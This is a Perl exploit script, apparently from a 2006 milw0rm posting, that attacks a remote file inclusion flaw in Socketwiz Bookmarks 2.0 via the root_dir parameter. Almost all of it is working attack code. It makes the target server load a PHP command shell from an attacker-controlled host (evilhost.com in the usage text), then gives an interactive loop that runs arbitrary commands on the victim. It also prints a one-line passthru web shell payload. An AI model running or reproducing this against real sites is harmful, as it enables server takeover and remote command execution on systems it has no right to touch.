#!/usr/bin/perl

use LWP::UserAgent;

#/*
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- Socketwiz Bookmarks <= 2.0 (root_dir) Remote File Include Exploit
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- [Script name: Socketwiz Bookmarks v. 2.0
#- [Script site: http://www.hotscripts.pl/pobierz-2232.html
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-          Find by: Kacper (a.k.a Rahim)
#+		  
#-          Contact: kacper1964@yahoo.pl   
#-                        or   
#-           http://www.rahim.webd.pl/
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#- Special Greetz: DragonHeart ;-)
#- Ema: Leito, Leon, Adam, DeathSpeed, Drzewko, pepi, mivus ;]
#-
#!@ Przyjazni nie da sie zamienic na marne korzysci @!
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#+
#-            Z Dedykacja dla osoby,
#-         bez ktorej nie mogl bym zyc...
#-           K.C:* J.M (a.k.a Magaja)
#+
#+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# usage:
# perl exploit.pl <Socketwiz Bookmarks Locaction> <shell location> <shell cmd>
#
# perl exploit.pl http://site.com/[Socketwiz Bookmarks_Path]/ http://site.com/cmd.txt cmd
#
# cmd shell example: <?passthru($_GET[cmd]);?>
#
# cmd shell variable: ($_GET[cmd]);
###################################################




$sciezka = $ARGV[0];

$sciezkacmd = $ARGV[1];

$komenda = $ARGV[2];

if($sciezka!~/http:\/\// || $sciezkacmd!~/http:\/\// || !$komenda){usage()}

head();

while()
{
print "[shell] \$";
while(<STDIN>)
{
$cmd=$_;
chomp($cmd);

$xpl = LWP::UserAgent->new() or die;

$req = HTTP::Request->new(GET=>$sciezka.'smarty_config.php?root_dir='.$sciezkacmd.'?&'.$komenda.'='.$cmd)or die "\nCouldNot connect\n";
$res = $xpl->request($req);

$return = $res->content;
$return =~ tr/[\n]/[&#234;]/;

if (!$cmd) {print "\nEnter a Command\n\n"; $return ="";}

elsif ($return =~/failed to open stream: HTTP request failed!/ || $return =~/: Cannot executea blank command in <b>/)

{print "\nCould Not Connect to cmd Host or Invalid Command Variable\n";exit}

elsif ($return =~/^<br.\/>.<b>Warning/) {print "\nInvalid Command\n\n"}

if($return =~ /(.+)<br.\/>.<b>Warning.(.+)<br.\/>.<b>Warning/)
{

$finreturn = $1;
$finreturn=~ tr/[&#234;]/[\n]/;
print "\r\n$finreturn\n\r";
last;


}
else {print "[shell] \$";}}}last;

sub head()
{
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
print "+          - - [DEVIL TEAM THE BEST POLISH TEAM] - -         +\n";
print "+Socketwiz Bookmarks <= 2.0 (root_dir) Remote File Include Exploit+\n";
print "+                http://www.rahim.webd.pl/                   +\n";
print "+                Find by: Kacper (a.k.a Rahim)               +\n";
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
}
sub usage()
{
head();
print " Usage: perl exploit.pl <Socketwiz Bookmarks Locaction> <shell location> <shell cmd>\r\n\n";
print " <swBookmarks Locaction> - Full path to Socketwiz Bookmarks ex: http://www.site.com/swBookmarks/\r\n";
print " <shell location> - Path to cmd Shell e.g http://www.evilhost.com/cmd.txt\r\n";
print " <shell cmd> - Command variable used in php shell \r\n";
print " ============================================================================\r\n";
print "                         Find by: Kacper (a.k.a Rahim)                       \r\n";
print "                           http://www.rahim.webd.pl/                         \r\n";
print "                          Special Greetz: DragonHeart ;-)                    \r\n";
print " ============================================================================\r\n";

exit();
}

#Pozdrawiam wszystkich ;-)

# milw0rm.com [2006-09-09]
